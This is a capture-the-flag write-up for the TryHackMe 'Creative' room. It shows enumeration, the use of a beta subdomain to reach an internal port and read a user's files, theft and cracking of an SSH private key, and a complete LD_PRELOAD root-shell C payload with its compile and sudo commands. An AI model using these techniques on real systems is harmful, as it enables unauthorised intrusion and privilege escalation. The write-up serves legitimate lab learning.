# Creative THM Room

I first enumerated using `nmap -sV <MACHINE-IP>` and found port 22, port 80, and port 1337 was open. I went to the webpage and found this: 

![Screenshot 2025-03-24 193049](https://github.com/user-attachments/assets/06625b0b-526b-4e22-814d-eba5be866179)

When I tried to enumerate for directories wit gobuster I didn't get anything interesting. On the other hand, when I enumerated for subdomains using `gobuster dns -d creative.thm -w directory-list-2.3-medium.txt -t 50`
I found beta.creative.thm which brings us to a page that looks like this: 

![Screenshot 2025-03-24 195827](https://github.com/user-attachments/assets/97d7b111-5319-47dd-9620-775c0b326bee)

My first thought was to enter localhost:1337, doing so I was able to get a directory listing for the webserver. Clicking on it did nothing so I went back to the page to
start messing around. 

![Screenshot 2025-03-24 200558](https://github.com/user-attachments/assets/55425be4-7bc8-407b-845c-4814c184db9f)

I found a user name saad and after typing this in I was able to see user.txt was there, the only thing I had to do to read user.txt was append /user.txt to the URL.

After finding the user flag the next step was to escalate privleges and get the root flag, I noticed in /home/saad there was /.ssh and then and then a private key inside 
/id_rsa.

To use the private key I saved it to a file on my linux machine titled id_rsa, when I tried to connect using `ssh -i id_rsa saad@creative.thm` I had to provide a passphrase.
To find the passphrase I copied the contents of id_rsa to id_rsa.hash using `ssh2john id_rsa > id_rsa.hash` Then I used `john id_rsa.hash --wordlist=./rockyou.txt` This was
able to find the passphrase I needed to login

![Screenshot 2025-03-24 202531](https://github.com/user-attachments/assets/e5218f18-9c50-49ca-a801-f8576fde2acb)

This next part was very tricky for me but I eventually found out I needed to do `cat .bash_history` to figure out what password Saad was actually using. This is important
because the first command I wanted to run was `sudo -l` to figure out where we had sudo privileges. Using the command I found out that we can use sudo on /usr/bin/ping.

Doing more research though it seems that its not really that useful, it seems that `env_keep+=LD_PRELOAD` was actually what I should've been focusing on here. 
I was able to create a file on the machine called shell.c in the /tmp directory with this code:


```c
#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>  // Add this to use setuid and setgid


void _init() {

    unsetenv("LD_PRELOAD");
    
    setgid(0);  // Set group ID to root (0)
    
    setuid(0);  // Set user ID to root (0)
    
    system("/bin/sh");  // Execute /bin/sh to get a shell
    
}
```

I ran  `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` and `sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping.` After running the ladder command I was able to 
extract the root.txt flag from the /root directory. 

